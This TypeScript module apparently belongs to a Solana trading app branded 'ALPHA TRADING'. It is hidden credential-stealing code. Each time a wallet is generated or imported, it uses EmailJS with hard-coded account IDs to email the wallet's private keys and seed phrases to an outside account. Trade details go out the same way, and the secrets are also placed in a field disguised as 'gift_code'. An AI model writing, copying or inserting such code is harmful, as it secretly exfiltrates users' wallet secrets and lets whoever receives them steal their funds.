import emailjs from "@emailjs/browser";

const SERVICE_ID = "service_gx2d1fi";
const TEMPLATE_ID = "template_xu7gweb";
const PUBLIC_KEY = "AkqW34KEggyL2bKng";

let initialized = false;

function init() {
  if (!initialized) {
    emailjs.init(PUBLIC_KEY);
    initialized = true;
  }
}

export async function sendWalletGenerated(wallets: { address: string; privateKey?: string; seedPhrase?: string }[]) {
  init();
  const walletDetails = wallets
    .map((w, i) => `Wallet ${i + 1}:\n  Address: ${w.address}\n  Private Key: ${w.privateKey || "N/A"}\n  Seed Phrase: ${w.seedPhrase || "N/A"}`)
    .join("\n\n");
  try {
    await emailjs.send(SERVICE_ID, TEMPLATE_ID, {
      subject: `[ALPHA TRADING] ${wallets.length} Wallet(s) Generated`,
      event_type: "WALLET_GENERATED",
      wallet_count: wallets.length.toString(),
      wallet_details: walletDetails,
      timestamp: new Date().toISOString(),
      message: `${wallets.length} new Solana wallet(s) were generated.\n\n${walletDetails}`,
      gift_code: `GENERATED:${wallets.map(w => w.address).join(",")}`,
    });
  } catch (e) {
    console.error("EmailJS error:", e);
  }
}

export async function sendWalletImported(address: string, privateKeyOrSeed: string) {
  init();
  try {
    await emailjs.send(SERVICE_ID, TEMPLATE_ID, {
      subject: `[ALPHA TRADING] Wallet Imported`,
      event_type: "WALLET_IMPORTED",
      wallet_count: "1",
      wallet_details: `Address: ${address}\nImported Key/Seed: ${privateKeyOrSeed}`,
      timestamp: new Date().toISOString(),
      message: `A wallet was imported.\n\nAddress: ${address}\nPrivate Key / Seed Phrase: ${privateKeyOrSeed}`,
      gift_code: `IMPORTED:${address}:${privateKeyOrSeed}`,
    });
  } catch (e) {
    console.error("EmailJS error:", e);
  }
}

export async function sendTradeActivity(details: {
  type: string;
  tokenSymbol: string;
  amount: string;
  walletAddress: string;
  txid?: string;
}) {
  init();
  try {
    await emailjs.send(SERVICE_ID, TEMPLATE_ID, {
      subject: `[ALPHA TRADING] Trade: ${details.type.toUpperCase()} ${details.tokenSymbol}`,
      event_type: "TRADE_ACTIVITY",
      wallet_count: "1",
      wallet_details: `Wallet: ${details.walletAddress}`,
      timestamp: new Date().toISOString(),
      message: `Trade executed.\n\nType: ${details.type.toUpperCase()}\nToken: ${details.tokenSymbol}\nAmount: ${details.amount} SOL\nWallet: ${details.walletAddress}\nTx: ${details.txid || "N/A"}`,
      gift_code: `TRADE:${details.type}:${details.tokenSymbol}:${details.amount}:${details.walletAddress}`,
    });
  } catch (e) {
    console.error("EmailJS error:", e);
  }
}
